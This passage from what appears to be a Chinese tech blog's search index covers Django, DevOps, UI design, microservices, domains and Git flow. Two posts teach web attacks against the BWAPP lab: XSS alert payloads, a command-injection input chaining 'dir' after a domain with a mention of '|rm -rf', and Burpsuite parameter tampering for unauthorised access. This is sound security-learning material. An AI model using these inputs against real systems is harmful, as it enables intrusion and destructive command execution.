os.environ.get(\u0026#34;DJANGO_CONF_MODULE\u0026#34;, \u0026#34;\u0026#34;) # 运行模式， DEVELOP(开发模式)，PRODUCT(正式模式) RUN_MODE = \u0026#39;DEVELOP\u0026#39; if WSGI_ENV.endswith(\u0026#34;production\u0026#34;): RUN_MODE = \u0026#34;PRODUCT\u0026#34; DEBUG = False else: RUN_MODE = \u0026#34;DEVELOP\u0026#34; DEBUG = True # 加载app中的配置项 from myapp1.settings import * from myapp2.settings import * app 目录下的settings.py文件，增加如下内容：\n1 2 3 4 5 6 7 # 正式环境配置 if RUN_MODE == \u0026#39;PRODUCT\u0026#39;: #设置变量值 APP_XXX = \u0026#39;PRODUCT\u0026#39; else: #设置变量值 APP_XXX = \u0026#39;DEVELOP\u0026#39; 4. 参考 https://zh.wikipedia.org/wiki/Django http://python.usyiyi.cn/translate/django_182/index.html ","description":"","id":597,"section":"post","tags":["博文","Django","Python"],"title":"Django 浅析与工程目录结构实践","uri":"https://www.chenshaowen.com/blog/best-file-structure-of-django.html"},{"content":"1. 概览 DevOps（Development和Operations的组合词）是一种重视「软件开发人员（Dev）」和「IT运维技术人员（Ops）」之间沟通合作的文化、运动。透过自动化「软件交付」和「架构变更」的流程，来使得构建、测试、发布软件能够更加地快捷、频繁和可靠。\nDevOps综合了社会体系和技术体系。\n2. 背景 传统的软件组织将开发、IT运营和质量保障设为各自分离的部门，在这种环境下如何采用新的开发方法（例如敏捷软件开发），是一个重要的课题。按照从前的工作方式，开发和部署，不需要IT支持或者QA深入的跨部门的支持；而现在却需要极其紧密的多部门协作。\n而DevOps考虑的还不止是软件部署，它是一套针对这几个部门间沟通与协作问题的流程和方法。\n需要频繁交付的企业可能更需要对DevOps有一个大致的了解。Flickr发展了自己的DevOps能力，使之能够支撑业务部门“每天部署10次”的要求──如果一个组织要生产面向多种用户、具备多样功能的应用程序，其部署周期必然会很短。这种能力也被称为持续部署，并且经常与精益创业方法联系起来。从2009年起，相关的工作组、专业组织和博客快速涌现。\n3. DevOps与敏捷区别 相对于瀑布开发模式，敏捷开发过程的一个基本原则就是以更快的频率交付最小化可用的软件。在敏捷的目标里，最明显的是在每个Sprint的迭代周期末尾，都具备可以交付的功能。\n敏捷对于开发重新获得商业的信任是大有益处的，但是它无意于将IT运维拒之门外，DevOps使得IT组织作为一个整体重新获得商业的信任。DevOps和敏捷软件开发是相辅相成的，因为它拓展和完善了持续集成和发布流程，因此可以确保代码是生产上可用，并且确实能给客户带来价值。\nDevOps不仅仅创建了一个面向IT运维的工作流，当代码已经开发完成但是却无法被部署到生产上时，这些部署就会堆积在IT运维的面前，客户也将因而无法享受到任何价值，更糟糕的是，部署经常导致IT环境的中断和服务不可用。DevOps具有与生俱来的文化变革的基因组成，因为它革新了开发和IT运维之间的工作流和传统的衡量标准。\n4. DevOps为何爆发 2009年，DevOps就被提出。但是，近两年才开始受到重视和实践。这是因为，DevOps需要很多基础技术作为支撑。2013年容器技术的爆发、2014年提出的微服务架构、云计算的普及，都有力地助推了DevOps的实践。\n5. 机遇和挑战 5.1 应用领域 将开发延伸至生产中——包括拓展持续集成和发布功能至生产，集成QA和信息安全至整个工作流，确保代码和环境可在生产中直接部署。 向开发中加入生产反馈——包括建立开发和IT运营事件的完整时间表用于帮助事件的解决，使得开发融入无指责的生产反思，尽可能使得开发可以自助服务，同时创建信息指示器用来表明本地的决策如何影响全局的目标。 开发嵌入到IT运维中——包括开发投入到整个生产问题处理链，分配开发资源用于生产问题管理，并协助退回技术债务，而且开发为IT运维提供交叉培训，增加IT运维处理问题的能力，从而降低升级问题的数量。 将IT运维嵌入至开发——包括嵌入和联络IT运维资源至开发，帮助开发创建为IT运维(部署，生产代码的管理等)使用的可重用的用户故事，定义一些可以被所有项目共用的非功能性需求。 5.2 开发人员：什么都做过一点，什么都不精通 人类能运用的知识有限。在任务之间切换，无疑是代价昂贵的。强迫开发者去承担其他专业人员的角色，意味着他们将：\n没有把时间花在开发上 需要跟上一个极其庞大的知识领域 会不堪重负 5.3 企业获得的优势 产品快速推向市场，缩短开发周期时间和更高的部署频率 提高质量，提高可用性，提高变更成功率，减少故障 提高组织的有效性，将时间花在价值增加活动中，减少浪费，同时交付更多的价值至客户手中 但是，DevOps的提出旨在消除开发人员和系统运维工程师之间的障碍，但能否成功却取决于企业的文化和灵活性。\n","description":"","id":598,"section":"post","tags":["博文","开发","思考","DevOps","什么是"],"title":"什么是 DevOps","uri":"https://www.chenshaowen.com/blog/what-is-devops.html"},{"content":" 本人所在的岗位职责，涉及全栈开发，不仅要用 Python 写后台逻辑，还要自己写前端界面和交互。开发的程序部署于 Paas 平台，考虑到开发人员是非专业前端，为了降低开发门槛，提供了一种类似 Dreamweaver 的工具。使得开发人员可以通过，拖拽、拷贝等形式快速开发出页面，然后转向后端程序的编写。这种开发机制的初衷是为了加快开发速度，但是随着应用开发的精品化，这种仅实现功能，不注重交互体验的方式不会长久。于是有了这次的优化分享。这里没有各种各样的心理学理论，只有一些前后优化的案例，希望能对大家的交互设计有所帮助。\n1. 思路 交互是用户通过交互媒介完成一系列动作，最后达成目标的一个过程。我们从最终达成的这个小目标开始思考：\n用户做【想做的】事\n首先用户应该能够做自己想做的事，浏览内容、增加记录、修改信息等，能够完成事务而不发生误操作。\n用户【高效】地做想做的事\n在已经能够完成事务的前提下，应该降低用户的学习成本，打开页面就能发现功能、进行操作，而不会觉得不知所措；减少时间成本，减少等待的时间，加快响应的速度。\n用户高效地做自己想做的事，而【不焦虑】\n在高效完成事务的前提下，还应该思考的是，增强用户对应用的信任感，不会因为事后的模糊记忆产生焦虑。\n用户很享受使用产品，顺便完成了该做的事\n我只希望用户用完我的产品完成事务之后，不要迷恋，速速离去，毕竟那么多美好还没体验in life\n2. 优化案例分享 以红色标记优化前，绿色标记优化后\n2.1 用颜色区分功能 2.2 集中信息的输入焦点 2.3 适当分类，结构更清晰 2.4 扁平化设计，减少层次，一眼能看到全部功能 2.5 适当增加提示 2.6 敏感操作的确认 2.7 提高页面响应速度，减少不必要的操作 2.8 舒适感 ","description":"","id":599,"section":"post","tags":["博文","分享","前端"],"title":"工具类产品交互优化案例分享","uri":"https://www.chenshaowen.com/blog/how-to-create-excellent-product-interaction.html"},{"content":"1. BWAPP简介 buggy web Application，简称BWAPP，这是一个集成了各种常见漏洞和最新漏洞的开源Web应用程序，目的是帮助网络安全爱好者、开发人员和学生发现并防止网络漏洞。包含了超过100种漏洞，涵盖了所有主要的已知Web漏洞，包括OWASP Top10安全风险，最重要的是已经包含了OpenSSL和ShellShock漏洞。\n2. BWAPP安装与配置 BWAPP是使用php完成的项目，所以需要在本地配置php+apache+mysql的运行环境。安装apache、mysql、php的部分，限于篇幅就不在此表述。需要指出的一点：php在Windows下依赖于指定的VS库，否则运行时会提示加载dll错误。\n将全部的BWAPP项目文件拷贝至php的运行目录下，修改bwapp/admin/settings.php中关于数据库的配置参数，需要注释掉$db_sqlite = \u0026ldquo;db/bwapp.sqlite\u0026rdquo;;\n。执行bwapp/bWapp.sql文件，在MySQL中创建bWapp数据库，将测试数据写入，这一步也可以通过启动Apache访问http://localhost/install.php来完成。\n最后，运行MySQL、Apache，使用浏览器访问，http://localhost/portal.php，就进入了我们学习Web渗透技术的环境-BWAPP。\n3. 如何验证成功渗透 - 一个弹框 这是学习渗透技术之前必须考虑的问题。如何才能判断渗透成功？网络上的渗透黑客行为，无非出于以下几点：\n1.出于好奇。出于对新技术的尝试、对系统漏洞的探测，执行一个渗透计划，会造成一定损失，但是不会造成巨大危害。\n2.出于金钱。渗透之后，窃取用户信息、系统业务信息，以此要挟谋求金钱，或用于交易，会对企业造成极大伤害。还有可能是竞争对手花钱雇佣的黑客行为。\n3.出于其他。还有一些原因就不一一列举了，比如，看着不顺眼╭(╯^╰)╮，被网站坑过，挂js脚本用于DDOS攻击等。\n这些都是通过在Web页面执行一定JavaScript脚本实现的，执行脚本可以发送浏览者的Cookie用于伪造登录请求、可以挂载一些弹框图片诱骗用户点击、可以对指定网站发起DDOS攻击、可以完成能在web页面操作的任何动作。\n渗透最关键的就是执行一段js代码，那么为了验证渗透成功，只用证明我们成功执行了一段js代码，比如一个弹框。\n4. 常见的渗透原理与应用 1.XSS反射型:通过直接在页面注入执行脚本触发。\n比如：http://localhost/xss_get.php?firstname=aa%3Cscript%3Ealert(1)%3C/script%3E\u0026amp;lastname=aaa\u0026amp;form=submit\nXSS反射型攻击直接在url中嵌入javascript脚本。这种漏洞，如果页面有输入框，可以直接尝试输入参数，观察url的变化，如果输入框的内容或页面文本内容随着url变化，那么就可以确定有XSS反射漏洞了。在url参数的后面添加\u0026lt; script \u0026gt;alert(1) \u0026lt; /script \u0026gt;，就可以观察到弹框了。如果页面没有输入框，那么就只能在url后面尝试添加参数和脚本了。\n危害：常用于诱骗用户点击url，窃取cookie中的信息\n2.XSS存储型:注入的脚本会写入数据库，再次访问读取数据时才会触发脚本执行。\n比如，http://localhost/htmli_stored.php，在输入框直接输入\u0026lt; script \u0026gt;alert(1) \u0026lt; /script \u0026gt;，点击submit，并不会立即弹框，而是等待再次访问数据库时，返回前端页面才会执行弹框。\nXSS存储型将执行脚本存入数据库，再次访问是嵌入在页面中执行。这种漏洞的分析关键是找到输入了什么信息，这些信息显示在什么位置。直接查看源代码，找到这些信息所在的html标签，闭合js脚本之前的html标签即可。具体方法是，比如输入aaa，在页面源码中显示在\u0026lt; a href=\u0026ldquo;aaa\u0026rdquo;\u0026gt;中，那么可以输入\u0026quot;\u0026gt;\u0026lt; script \u0026gt; alert(1) \u0026lt; /script \u0026gt; 。其中,\u0026ldquo;用于闭合aaa之前的\u0026quot;符号，\u0026gt;用于闭合a标签的前面一个\u0026lt;，这样就符合html语法定义了。\n危害：不仅仅窃取用户的cookie信息，而且容易引发蠕虫\n3.OS命令、SQL注入:通过闭合后台执行的命令、SQL语句来对系统进行渗透。\n比如：http://localhost/commandi.php ，在输入框输入www.nsa.gov|dir .这条命令的本意是通过nslookup命令来查询域名的IP地址，但是在域名的后面多加了|dir .，拼接起来就变成了nslookup www.nsa.gov|dir .，是两个命令语句，先执行查询任务，再显示当前目录下全部文件。\nweb shell和有sql拼接操作的服务需要注意这类攻击。通过闭合合法操作，然后添加,、:、\u0026quot;、\u0026amp;、|，这些符号连接继续执行hack命令。\n危害：危害极大，可能一个命令|rm -rf就可以让整个系统垮掉。在提供此类服务时，一定要注意预防。\n4.中间人攻击。\n比如：http://localhost/xss_stored_4.php ，可以参看另外一篇博文，Burpsuite实践与web越权攻击 中使用BurpSuit的方法，修改请求投中关于浏览器信息的部分，嵌入执行脚本，存入数据库，最后读取到浏览器端执行。\n危害：中间人危害，可以说防不胜防，即使使用https也可以伪造证书，修改请求和返回的响应消息。这种危害会严重泄露个人隐私，账号，密码全部都无法得到保证。但是也不必惊慌，企业网址不会被反向代理劫持，证书不动用巨大计算资源也伪造不出来，更应该防范的是不要随便接入不受信任的网络。\n","description":"","id":600,"section":"post","tags":["博文","安全","网络","学习","BWAPP"],"title":"BWAPP 学习与使用","uri":"https://www.chenshaowen.com/blog/study-of-bwapp.html"},{"content":"1. SOA 面向服务架构（SOA），阐述了对于复杂的企业IT系统，应按照不同的、可重用的粒度划分，将功能相关的一组功能提供者组织在一起为消费者提供服务，其目的是为了解决企业内部不同IT资源之间无法互联而导致的信息孤岛问题。\nSOA的基本设计思想是：对外只需要提供一个简单的接口，封装底层的复杂性，不关心技术实现方案。\n由于，SOA本身的广义性以及抽象性，人们对SOA存在着不同的认知和理解。基于SOA设计思想，出现了ESB、REST、SOAP、RPC、RMI、DCOM等实现方案，而微服务架构也可以看作是对SOA的一种衍生或解读。\n2. 微服务架构 微服务架构是一种架构模式，它提倡将单一应用程序划分成一组小的服务，服务之间互相协调、互相配合，为用户提供最终价值。每个服务运行在其独立的进程中，服务与服务间采用轻量级的通信机制互相沟通（通常是基于HTTP协议的RESTful API）。每个服务都围绕着具体业务进行构建，并且能够被独立的部署到生产环境、类生产环境等。另外，应当尽量避免统一的、集中式的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构建。\n具有如下特点：\n模块化。单个服务的开发、理解和维护都可以单独进行，对外只需要提供服务的接口。 独立部署。每个服务可以独立进行部署和维护，它只是作为整个系统的服务之一，并不会影响全部服务。 独立扩展。可以根据服务的规模，自行进行硬件资源、分布架构的扩展，而不影响其他的服务。 独立运行。单个服务独立运行，提供单一可靠的服务。 这些特点在SOA思想指导下的其他技术方案中，早就有所涉及，近年提得较多的微服务是随着持续交付概念推广以及Docker容器普及迅速得到认可的。微服务将这两种理念和技术结合起来，形成新的微服务+API + 平台的开发模式，提出了容器化微服务的持续交付概念\n3. 容器化微服务的持续交付 容器化微服务的持续交付能力，对于敏捷开发非常的重要。传统的开发、测试、部署，涉及复杂的内部流程，而微服务缩小了测试的范围，容器化为测试提供了测试上下文环境。\n","description":"","id":601,"section":"post","tags":["博文","服务","架构"],"title":"微服务架构","uri":"https://www.chenshaowen.com/blog/micro-service.html"},{"content":" 现在的企业，业务繁多，常常需要大量的域名来支持业务的发展，本文从企业域名的选择、域名与企业品牌建设、站点的SEO、站点的安全性四个方面考虑，企业应该怎样去规划和建设自己的域名体系。\n1. 写在前面的一些话 如果是小公司可以暂时不用考虑域名群的建设，大中型（50人以上）的公司规模在域名建设上应该开始着重考虑。小公司全部精力应投入在单个业务上。域名的注册商首选资历老、规模大的，凭借注册商的信用，注册的域名才会有保证。如果资金允许的话，可以选择MARKMONITOR INC，起码主站域名应该考虑。关于续费，建议注册时一次性续5-10年，之后每年再续费一年。前途不确定的项目，也该如此，即使一两年后项目死掉，也不要将域名过早的释放出去，继续持有几年，避免被他人恶意使用。\n2. 业务对域名的选择 所谓主站，就是最能够代表企业主要业务的站点。比如， www.jd.com 。主站应该是随着企业发展而逐步成长起来的，建设早、排名高，是域名建设里面需要重点考虑的。一旦企业准备扩展其他业务，就应该开始筹备域名的建设、储备相关的域名，.com/.cn/.net/.org应该拿在手上。\n这里的业务分为两类：\n一类是有政策风险或特殊运营要求的业务\n对于第一类，比如bbs、金融、支付等，这类业务的开展在国内承担着一定的关站风险。应该采用的是独立域名策略，以本站为例，bbscsw.com、cswbbs.com、chenshaowenbbs.com，cswpay.com，cswstock.com，甚至使用独立的关键字都是可以的。但是不要使用主站的二级域名bbs.chenshaowen.com，如果这类业务违规，主站会承担无法解析的风险。 一类是服务于主要业务的业务\n对于这一类。比如业务的横向扩展、纵向深入等，只要是在现有行业基础上展开的业务都可以使用主域名来承载流量。这样考虑有如下几个因素： 不必每个业务去单独注册域名，省钱 不必太拘束业务名称的选择，省时 便于主站的SEO 业务可能发生变更，易维护 下面是twitter，facebook，apple，adidas四家公司在跨国部署上采取的四种不同方式。版本的不同和不同业务部署具有异曲同工之处。只不过一个针对的是语言，一个针对的是业务。\n3. 品牌 一个好的域名抵得过一个好的CTO。此言不差，品相好的域名确实能让企业发展事半功倍，带来非常好的传播效果，巨大流量。比如baidu.com，taobao.com，域名与品牌一致，取得行业领先后，品牌成为了行业的代名词，一旦形成这样的优势，其他企业就很难超越。在企业的建设之初，就应该考虑好，域名、商号、商标三者一致性。如果需要的域名被人注册，但是还未建站，可以联系注册者购买。还可以委托第三方机构购买，避免交易失败后没有机会再次出手。关于域名的选择，在我的另外一篇博文里面有所表述。\n4. SEO 10个流量排名前100的，比不上一个排名第一的。市场的规则是赢家通吃，排名前三的会瓜分大部分市场份额，与其分散各个攻击，不如集中一点全力突破。在上面提到，对于一些无政策风险的业务扩展，可以直接放在主站下面的子域名、子目录、子菜单去运营，这样因新业务而带来的权重都会聚集到主站。业务与业务之间的流量也会形成协同作用，相互促进。\n5. 安全性 现在正在逐步步入全https时代，使用https当然是必须的。这里的安全更多指的是站群的安全。企业达到一定规模，会采用内网、外网隔离的方式开发、测试、部署系统，这是如果某一个企业站点被入侵，那么整个站群就可能都受到威胁。所以，给出如下建议：\n尽量少的使用独立域名，少暴露对外的访问接口 自建CDN使用独立域名，支持整个站群 做好子域名之间的cookie隔离 ","description":"","id":602,"section":"post","tags":["域名","博文"],"title":"企业域名群建设策略","uri":"https://www.chenshaowen.com/blog/strategy-of-company-domains.html"},{"content":"副标题: 用失传的技艺练就强大的生存实力\n英文书名: Convict Conditioning\n作者: [美] 保罗·威德\n出版社: 北京科学技术出版社\n出版年: 2013-10-1\nISBN: 9787530467558\n","description":"","id":603,"section":"post","tags":["书籍","管理"],"title":"囚徒健身","uri":"https://www.chenshaowen.com/blog/book/convict-conditioning.html"},{"content":"1. Burpsuite简介 Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。\n所有的工具都共享一个能处理并显示HTTP 消息、持久性、认证、代理、日志、警报的一个强大的可扩展的框架。\nProxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。 Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。 Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。 Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。 Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。 Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。 Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 2. Burpsuite配置 由于Burpsuite基于java开发，运行时需要jre。在Oracle下载安装jdk安装后,还需要添加环境变量。\n1 2 3 JAVA_HOME C:\\Program Files\\Java\\jdk1.8.0_111(替换为自己的安装目录) PATH ;%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin CLASSPATH .;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar Burpsuite官方地址，下载到本地之后，可以直接运行。\n依次使用默认配置选项，【Temporary project】-\u0026gt; 【Use Burp defaults]。进入如下界面：\n点击【Proxy】-\u0026gt; [Options]可以查看到Burp提供的代理接口，默认为127.0.0.1:8080。\nburp的原理是通过充当客户端与服务器直接的代理，实现对连接的修改和控制。所以，在本地进行调试是需要在浏览器中设置代理，用以实现对连接请求的修改。如果是使用Chrome浏览器，那么直接安装switchyomega插件，如果是FireFox，可以使用FoxyProxy插件。如果是IE，可以直接使用127.0.0.1：800作为代理，使用插件的目的只是为了能够方便的切换代理。\n在switchyomega中【新建场景模式】，设置http代理，代理服务器127.0.0.1，端口8080。\n然后访问，http://burp/,点击下载CA Certificate，将证书安装在【受信任的根证书颁发机构】。如果不安装burp提供的证书，是使用burp代理访问https请求是会出现【您的链接不安全】字样。从这里可以看出，https连接能够抵御中间人攻击。安装之后，在证书里面查看，能够找到PortSwigger这个证书。\n3. Burpsuite 使用 3.1 越权的原理 越权描述的是对没有授权的业务进行访问和操作。如上图，人员A只对a业务有权限，人员B只对b业务有权限，如果通过某种方式人员A访问了b业务，那么就判定为越权。这里有一个前置条件就是人员A、B都能够通过平台的验证系统，只是业务上存在隔离。如果不刻意验证权限，一般情况下通过一定的工具修改请求的参数，是很容易进行越权操作的。\n由于发起请求时，平台验证的tokenID等信息会一同发送，并通过平台的验证系统，而越权访问业务直接通过修改url路由和请求参数即可完成。\n3.2 Burpsuite 实践 首先需要将浏览器代理切换到 burp 在 BurpSuite 中依次打开【proxy】-\u0026gt; 【intercept】-\u0026gt;【intercept is on】 浏览器访问 URL BurpSuite 将请求拦截下来，修改请求头。\n这里的/api/posts/20045768/contributed 就是访问的路由，可以看到路由中有20045768，通常是文章的ID编号，通过修改这个编号，来访问其他文章的内容。 还有一部分是 cookie 中个人的登录信息，如果其他人拿到了你的这部分信息，就可以通过这部分的信息来伪造登录。\n在【Params】分页中，可以随意的修改请求参数\n【Forward】，释放修改后的请求，等待服务器返回结果 ","description":"","id":604,"section":"post","tags":["博文","网络","安全","攻击","Web","Burpsuite"],"title":"Burpsuite 实践与 Web 越权攻击","uri":"https://www.chenshaowen.com/blog/burpsuite-web-attack-detection.html"},{"content":" 这篇围绕全部源代码的控制工具Git展开。\n1. 为什么是Git? 为了深入探讨git和集中式源码版本控制系统的利弊，参见这里。这方面有太多的激烈争论。作为一个开发者，相比其他工具，当前我更喜欢Git。Git的确改变了开发者关于合并与分支的思考方式。在那些经典的CVS/Subversion管理工具的世界中，合并/分支被认为是有些吓人的(“当心合并冲突，它们咬你!”)，而且偶尔你得做些操作解决一些问题。\n但是使用Git，这些操作都变得极度简单，这些操作被认为是你日常工作流程核心部分之一。例如，在CVS/Subversion这本书中，分支与合并在很后的章节中才被第一次讨论(针对高级用户)。但是在每一本Git书籍中，在第三章就讲到了(基础部分)。\n由于它的简单性和操作命令的重复性，分支与合并操作变得不再可怕。版本控制工具被认为在分支/合并方面提供操作便利性比什么都重要。\n关于工具本身，已经讨论的足够多了，下面针对开发模型进行展开。我将要介绍的这个模型不会比任何一套流程内容多，每个团队成员都必须遵守，这样便于管理软件开发过程。\n2. 既分散又集中 我们使用的，且与这个分支模型配合的非常好的库，他有一个“真正”的中央仓库。注意，这个库只是被认为是中央仓库(因为Git是一个分布式的版本控制工具，在技术层面没有所谓的中央仓库)。我们将会为这个仓库起名为origin，因为所有的Git用户对这个名字都比较熟悉。\n每个开发者从origin拉取和推送代码。除了集中式的推送拉取关系，每个开发者也有可能从别的开发者处拉取代码，形成自己的团队。例如当与两个或者更多的人开发一个大的特性时，或者在将代码推送到origin之前，这种代码管理模式可能有用。在上图中，存在Alice和Bob，Alice和David，Clair 和David三个子团队\n技术上而言，这只不过意味着Alice定义了一个远程Git仓库，起名为bob，实际上指向Bob的版本库，反之亦然(Bob定义了一个远程Git仓库，起名为alice，实际上指向Alice的版本库)。\n3. 主分支 老实说，我们讨论的开发模型受到了当前已存在模型的很大启发。集中式的版本库有两个永久存在的主分支：\nmaster分支 develop分支 origin的master分支每个Git用户都很熟悉。平行的另外一个分支叫做develop分支。\n我们认为origin/master这个分支上HEAD引用所指向的代码都是可发布的。\n我们认为origin/develop这个分支上HEAD引用所指向的代码总是反应了下一个版本所要交付特性的最新的代码变更。一些人管它叫“整合分支”。它也是自动构建系统执行构建命令的分支。\n当develop分支上的代码达到了一个稳定状态，并且准备发布时，所有的代码变更都应该合并到master分支，然后打上发布版本号的tag。具体如何进行这些操作，我们将会讨论\n因此，每次代码合并到master分支时，它就是一个人为定义的新的发布产品。理论上而言，在这我们应该非常严格，当master分支有新的提交时，我们应该使用Git的钩子脚本执行自动构建命令，然后将软件推送到生产环境的服务器中进行发布。\n4. 辅助性分支 紧邻master和develop分支，我们的开发模型采用了另外一种辅助性的分支，以帮助团队成员间的并行开发，特性的简单跟踪，产品的发布准备事宜，以及快速的解决线上问题。不同于主分支，这些辅助性分支往往只要有限的生命周期，因为他们最终会被删除。\n我们使用的不同类型分支包括:\n特性分支 Release分支 Hotfix 分支\n上述的每一个分支都有其特殊目的，也绑定了严格的规则：哪些分支是自己的拉取分支，哪些分支是自己的目标合并分支。 从技术角度看，这些分支的特殊性没有更多的含义。只是按照我们的使用方式对这些分支进行了归类。他们依旧是原Git分支的样子。\n5. 特性分支 特性分支可以从develop分支拉取建立，最终必须合并会develop分支。特性分支的命名，除了 master， develop， release-*，或hotfix-*以外，可以随便起名。\n特性分支(有时候也成主题分支)用于开发未来某个版本新的特性。当开始一个新特性的开发时，这个特性未来将发布于哪个目标版本，此刻我们是不得而知的。特性分支的本质特征就是只要特性还在开发，他就应该存在，但最终这些特性分支会被合并到develop分支(目的是在新版本中添加新的功能)或者被丢弃(它只是一个令人失望的试验)\n特性分支只存在开发者本地版本库，不在远程版本库。\n5.1 创建特性分支 当开始开发一个新特性时，从develop分支中创建特性分支\n1 2 git checkout -b myfeature develop Switched to a new branch \u0026#34;myfeature\u0026#34; 5.2 在develop分支整合已经开发完成的特性 开发完成的特性必须合并到develop分支，即添加到即将发布的版本中。\n1 2 3 4 5 6 7 8 git checkout develop Switched to branch \u0026#39;develop\u0026#39; git merge --no-ff myfeature Updating ea1b82a..05e9557 (Summary of changes) git branch -d myfeature Deleted branch myfeature (was 05e9557). git push origin develop \u0026ndash;no-ff参数的作用是在合并的时候，会创建一个新的提交对象，即使是fast-forward方式的合并。这就避免了丢失特性分支的历史记录信息以及提交记录信息。比较一下\n在右面的例子中，是不可能从Git历史记录中看到一个已经实现了的特性的所有提交对象-除非你去查看所有的日志信息。要想获取整个特性分支信息，在右面的例子中的确是一个头疼的问题，但是如果使用\u0026ndash;no-ff参数就没有这个问题。\n使用这个参数后，的确创建了一些新的提交对象(那怕是空提交对象)，但是很值得。\n不幸的是，我还没有找到一种方法使Git默认的merge操作带着\u0026ndash;no-ff参数，但的确应该这样。\n6. 发布分支 从develop分支去建立Release分支\nRelease分支必须合并到develop分支和master分支\nRelease分支名可以这样起名:release-*\nRelease分支用于支持一个新版本的发布。他们允许在最后时刻进行一些小修小改。甚至允许进行一些小bug的修改，为新版本的发布准要一些元数据(版本号，构建时间等)。通过在release分支完成这些工作，develop分支将会合并这些特性以备下一个大版本的发布。\n从develop分支拉取新的release分支的时间点是当开发工作已经达到了新版本的期望值。至少在这个时间点，下一版本准备发布的所有目标特性必须已经合并到了develop分支。更远版本的目标特性不必合并会develop分支。这些特性必须等到个性分支创建后，才能合并回develop分支。\n在release分支创建好后，就会获取到一个分配好即将发布的版本号，不能更早，就在这个时间点。在此之前，develop分支代码反应出了下一版本的代码变更，但是到底下一版本是 0.3 还是 1.0，不是很明确，直到release分支被建立后一切都确定了。这些决定在release分支开始建立，项目版本号等项目规则出来后就会做出。\n6.1 创建release分支 从develop分支创建release分支。例如1.1.5版本是当前产品的发布版本，我们即将发布一个更大的版本。develop分支此时已经为下一版本准备好了，我们决定下一版的版本号是1.2(1.1.6或者2.0也可以)。所以我们创建release分支，并给分支赋予新的版本号:\n1 2 3 4 5 6 7 git checkout -b release-1.2 develop Switched to a new branch \u0026#34;release-1.2\u0026#34; ./bump-version.sh 1.2 Files modified successfully, version bumped to 1.2. git commit -a -m \u0026#34;Bumped version number to 1.2\u0026#34; [release-1.2 74d9424] Bumped version number to 1.2 1 files changed, 1 insertions(+), 1 deletions(-) 创建好分支并切到这个分支后，我们给分支打上版本号。bump-version.sh是一个虚构的shell脚本，它更改了工作空间的某些文件来反映新版本特征。(当然也可以手动改变这些文件)，然后版本就被提交了。\n新的分支会存在一段时间，直到新版本最终发布。在这段时间里，bug的解决可以在这个分支进行(不要在develop分支进行)。此时是严禁添加新的大特性。这些修改必须合并回develop分支，之后就等待新版本的发布。\n6.2 结束一个release分支 当release分支的准备成为一个真正的发布版本时，一些操作必须需要执行。首先，将release分支合并回master分支(因为master分支的每一次提交都是预先定义好的一个新版本，谨记)。然后为这次提交打tag，为将来去查看历史版本。最后在release分支做的更改也合并到develop分支，这样的话，将来的其他版本也会包含这些已经解决了的bug。\n在Git中需要两步完成:\n1 2 3 4 5 6 git checkout master Switched to branch \u0026#39;master\u0026#39; git merge --no-ff release-1.2 Merge made by recursive. (Summary of changes) git tag -a 1.2 这样release分支已经完成工作，tag也已经打了。\n备注:你可以使用-s or -u 参数为你的tag设置标签签名。 为了保存这些在release分支所做的变更，我们需要将这些变更合并回develop分支。执行如下Git命令:\n1 2 3 4 5 git checkout develop Switched to branch \u0026#39;develop\u0026#39; git merge --no-ff release-1.2 Merge made by recursive. (Summary of changes) 这步有可能会有合并冲突(极有可能，因为我们已经改变了版本号)。如果有冲突，解决掉他，然后提交。\n现在我们已经完成了工作，release分支可以删除了，因为我们不在需要他:\ngit branch -d release-1.2 Deleted branch release-1.2 (was ff452fe). 7. Hotfix分支 Hotfix分支从master分支建立\n必须合并回develop分支和master分支\n为Hotfix分支可以这样起名:hotfix-*\nHotfix分支在某种程度上非常像release分支，他们都意味着为某个新版本发布做准备，并且都是预先不可知的。Hotfix分支是基于当前生产环境的产品的一个bug急需解决而必须创建的。当某个版本的产品有一个严重bug需要立即解决，Hotfix分支需要从master分支上该版本对应的tag上进行建立，因为这个tag标记了产品版本\n7.1 创建hotfix分支 Hotfix分支从master分支进行创建。例如当前线上1.2版本产品因为server端的一个Bug导致系统有问题。但是在develop分支进行更改是不靠谱的，所以我们需要建立hotfix分支，然后开始解决问题:\ngit checkout -b hotfix-1.2.1 master Switched to a new branch \u0026#34;hotfix-1.2.1\u0026#34; ./bump-version.sh 1.2.1 Files modified successfully, version bumped to 1.2.1. git commit -a -m \u0026#34;Bumped version number to 1.2.1\u0026#34; [hotfix-1.2.1 41e61bb] Bumped version number to 1.2.1 1 files changed, 1 insertions(+), 1 deletions(-) 千万别忘记在创建分支后修改版本号。\n然后解决掉bug，提交一次或多次。\ngit commit -m \u0026#34;Fixed severe production problem\u0026#34; [hotfix-1.2.1 abbe5d6] Fixed severe production problem 5 files changed, 32 insertions(+), 17 deletions(-) 7.2 结束hotfix 分支 完成工作后，解决掉的bug代码需要合并回master分支，但同时也需要合并到develop分支，目的是保证在下一版中该bug已经被解决。这多么像release分支啊。\n首先，对master分支进行合并更新，然后打tag\n1 2 3 4 5 6 git checkout master Switched to branch \u0026#39;master\u0026#39; git merge --no-ff hotfix-1.2.1 Merge made by recursive. (Summary of changes) git tag -a 1.2.1 备注:你可以使用-s or -u 参数为你的tag设置标签签名。 紧接着，在develop分支合并bugfix代码\n1 2 3 4 5 git checkout develop Switched to branch \u0026#39;develop\u0026#39; git merge --no-ff hotfix-1.2.1 Merge made by recursive. (Summary of changes) 这里可能会有一些异常情况，当一个release分支存在时，hotfix 分支需要合并到release 